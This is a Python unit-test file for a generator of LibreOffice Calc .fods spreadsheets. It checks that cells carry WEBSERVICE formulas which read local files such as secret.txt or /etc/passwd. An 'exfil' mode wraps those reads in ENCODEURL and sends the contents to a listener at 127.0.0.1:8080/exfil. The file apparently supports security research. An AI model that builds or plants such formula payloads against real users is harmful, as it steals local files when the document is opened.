import unittest

from generators import calc_file_generator as calc


class CalcGeneratorTests(unittest.TestCase):
    def test_windows_drive_path_becomes_file_url(self):
        self.assertEqual(
            calc.to_file_url(r"C:\Users\demo\secret.txt"),
            "file:///C:/Users/demo/secret.txt",
        )

    def test_posix_path_becomes_file_url(self):
        self.assertEqual(calc.to_file_url("/etc/hosts"), "file:///etc/hosts")

    def test_spaces_are_percent_encoded(self):
        self.assertEqual(
            calc.to_file_url(r"C:\Program Files\app x.txt"),
            "file:///C:/Program%20Files/app%20x.txt",
        )

    def test_existing_file_url_is_left_untouched(self):
        self.assertEqual(
            calc.to_file_url("file:///C:/already/a/url.txt"),
            "file:///C:/already/a/url.txt",
        )

    def test_content_xml_contains_formula(self):
        xml = calc._content_xml(
            "Title",
            "2024-01-01T00:00:00+00:00",
            [(r"C:\Users\demo\secret.txt", "file:///C:/Users/demo/secret.txt")],
        )
        self.assertIn("application/vnd.oasis.opendocument.spreadsheet", xml)
        self.assertIn(
            'table:formula="of:=WEBSERVICE(&quot;file:///C:/Users/demo/secret.txt&quot;)"',
            xml,
        )

    def test_file_label_uses_basename(self):
        self.assertEqual(calc._file_label(r"C:\Users\demo\secret.txt"), "secret.txt")
        self.assertEqual(calc._file_label("/etc/passwd"), "passwd")

    def test_exfil_formula_nests_encodeurl(self):
        cell = calc._exfil_formula_cell(
            "file:///C:/Users/demo/secret.txt",
            "secret.txt",
            "http://127.0.0.1:8080/exfil",
        )
        self.assertIn('table:formula="of:=WEBSERVICE(', cell)
        self.assertIn("ENCODEURL", cell)
        self.assertIn("&amp;d=", cell)
        self.assertIn("file:///C:/Users/demo/secret.txt", cell)

    def test_content_xml_exfil_mode_uses_listener(self):
        xml = calc._content_xml(
            "Title",
            "2024-01-01T00:00:00+00:00",
            [(r"C:\Users\demo\secret.txt", "file:///C:/Users/demo/secret.txt")],
            mode="exfil",
            exfil_url="http://127.0.0.1:8080/exfil",
        )
        self.assertIn("http://127.0.0.1:8080/exfil", xml)
        self.assertIn("ENCODEURL(WEBSERVICE(", xml)
        self.assertIn("Exfiltrated via WEBSERVICE", xml)

    def test_write_fods_emits_formula(self):
        output_path = calc.OUTPUT_DIR / "_test_webservice.fods"
        self.addCleanup(lambda: output_path.unlink(missing_ok=True))
        calc.write_fods(output_path, [r"C:\Users\demo\secret.txt"])
        xml = output_path.read_text(encoding="utf-8")
        self.assertIn(
            'table:formula="of:=WEBSERVICE(&quot;file:///C:/Users/demo/secret.txt&quot;)"',
            xml,
        )

    def test_non_fods_extension_is_rejected(self):
        with self.assertRaises(ValueError):
            calc.generate("demo.ods", [r"C:\Users\demo\secret.txt"])

    def test_path_lines_comments_and_blanks_are_ignored(self):
        self.assertEqual(
            calc._parse_path_lines(["# comment", "", r"C:\a.txt", "  ", "/etc/b.txt"]),
            [r"C:\a.txt", "/etc/b.txt"],
        )


if __name__ == "__main__":
    unittest.main()
